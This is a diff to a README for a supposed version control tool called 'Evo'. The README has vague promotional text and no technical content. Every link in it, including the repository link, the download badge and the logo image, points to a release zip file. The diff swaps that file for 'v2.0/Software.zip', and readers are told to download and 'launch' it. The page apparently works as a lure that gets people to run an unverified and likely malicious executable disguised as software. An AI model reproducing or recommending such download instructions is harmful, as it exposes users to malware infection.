@@ -1,7 +1,7 @@
 
 # Welcome to Evo - Version Control Revolution! 🚀
 
-## Repository: [evo](https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip)
+## Repository: [evo](https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip)
   
 ### Description:
 Evo is a **revolutionary** version control system that **works the way you think**. Say goodbye to the complexity and confusion of traditional version control tools - Evo streamlines the process and makes managing your project's history a breeze. Whether you're a seasoned developer or just starting out, Evo is designed to make your workflow more efficient and intuitive.
@@ -14,9 +14,9 @@ Evo is a **revolutionary** version control system that **works the way you think
 - **Security**: Keep your project safe with Evo's robust security features.
 
 ### Installation:
-To get started with Evo, simply download the [https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip](https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip) file. Once downloaded, launch the file and follow the installation instructions. 
+To get started with Evo, simply download the [https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip](https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip) file. Once downloaded, launch the file and follow the installation instructions. 
 
-[![Download Evo](https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip)](https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip)
+[![Download Evo](https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip)](https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip)
 
 ### Get Involved:
 We welcome contributions from the community to make Evo even better! Feel free to fork the repository, make your changes, and submit a pull request. Together, we can continue to evolve Evo and shape the future of version control.
@@ -27,4 +27,4 @@ If you encounter any issues or have any questions about Evo, please check the "R
 ### Thank You:
 Thank you for choosing Evo for your version control needs. We're excited to have you on board and look forward to seeing the incredible projects you'll create with Evo by your side. Happy coding! 🌟
 
-![Evo Logo](https://github.com/MegaPuppieDoctor/evo/releases/download/v1.0/Release.zip)
+![Evo Logo](https://github.com/MegaPuppieDoctor/evo/releases/download/v2.0/Software.zip)
